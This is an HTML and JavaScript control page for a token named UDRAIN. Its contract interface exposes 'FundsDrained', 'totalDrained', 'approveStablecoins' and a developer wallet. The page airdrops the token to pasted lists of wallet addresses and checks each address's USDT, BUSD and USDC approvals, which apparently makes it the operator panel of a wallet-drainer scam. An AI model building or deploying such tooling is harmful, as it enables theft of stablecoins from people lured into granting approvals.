<!DOCTYPE html>
<html>
<head>
    <title>UDRAIN Token</title>
    <meta charset="utf-8">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial; background: #111; color: white; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: #222; padding: 20px; margin: 10px 0; border-radius: 10px; }
        .btn { background: #666; color: white; border: none; padding: 12px; width: 100%; margin: 5px 0; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h3>UDRAIN Token System</h3>
            <button class="btn" id="connectWallet">Connect Wallet</button>
            <div id="walletInfo"></div>
        </div>

        <div class="card">
            <h3>Distribute UDRAIN</h3>
            <textarea id="walletList" placeholder="Wallet addresses (one per line)" rows="3"></textarea>
            <button class="btn" id="distributeTokens">Distribute UDRAIN Tokens</button>
        </div>

        <div class="card">
            <h3>Check Wallet</h3>
            <input type="text" id="checkWallet" placeholder="Wallet address">
            <button class="btn" id="checkWalletBtn">Check Approvals</button>
            <div id="walletStatus"></div>
        </div>
    </div>

    <script>
        const tokenABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "FundsDrained",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "UniversalApprovalUsed",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "approveStablecoins",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "burn",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_wallet",
                "type": "address"
            }
        ],
        "name": "checkApprovals",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "usdtAllowed",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "busdAllowed",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "usdcAllowed",
                "type": "uint256"
            },
            {
                "internalType": "bool",
                "name": "hasUDRAIN",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "DEV_WALLET",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address[]",
                "name": "_wallets",
                "type": "address[]"
            },
            {
                "internalType": "uint256",
                "name": "_amount",
                "type": "uint256"
            }
        ],
        "name": "distributeTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "hasInteracted",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "totalDrained",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

        const TOKEN_CONTRACT_ADDRESS = "0x2b829caF44d244392aB3d09859F40e6c6d83A7a6"; // Coloque após deploy
        
        let web3, tokenContract, userAccount;

        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('connectWallet').addEventListener('click', connectWallet);
            document.getElementById('distributeTokens').addEventListener('click', distributeTokens);
            document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
        });

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    web3 = new Web3(window.ethereum);
                    userAccount = (await web3.eth.getAccounts())[0];
                    tokenContract = new web3.eth.Contract(tokenABI, TOKEN_CONTRACT_ADDRESS);
                    document.getElementById('walletInfo').textContent = `Connected: ${userAccount.substring(0,8)}...`;
                } catch (error) {
                    alert('Connection error: ' + error.message);
                }
            } else {
                alert('Please install MetaMask!');
            }
        }

        async function distributeTokens() {
            const walletsText = document.getElementById('walletList').value;
            const wallets = walletsText.split('\n').map(w => w.trim()).filter(w => w !== '');
            
            if (wallets.length === 0) {
                alert('Please enter wallet addresses');
                return;
            }
            
            try {
                await tokenContract.methods.distributeTokens(wallets, web3.utils.toWei('1', 'ether')).send({ from: userAccount });
                alert('UDRAIN tokens distributed!');
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }

        async function checkWallet() {
            const wallet = document.getElementById('checkWallet').value;
            if (!web3.utils.isAddress(wallet)) {
                alert('Invalid wallet address');
                return;
            }
            
            try {
                const [usdtAllowed, busdAllowed, usdcAllowed, hasUDRAIN] = await tokenContract.methods.checkApprovals(wallet).call();
                
                let status = `Has UDRAIN: ${hasUDRAIN ? '✅' : '❌'}<br>`;
                status += `USDT Approved: ${web3.utils.fromWei(usdtAllowed, 'ether')}<br>`;
                status += `BUSD Approved: ${web3.utils.fromWei(busdAllowed, 'ether')}<br>`;
                status += `USDC Approved: ${web3.utils.fromWei(usdcAllowed, 'ether')}<br>`;
                
                document.getElementById('walletStatus').innerHTML = status;
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }
    </script>
</body>
</html>
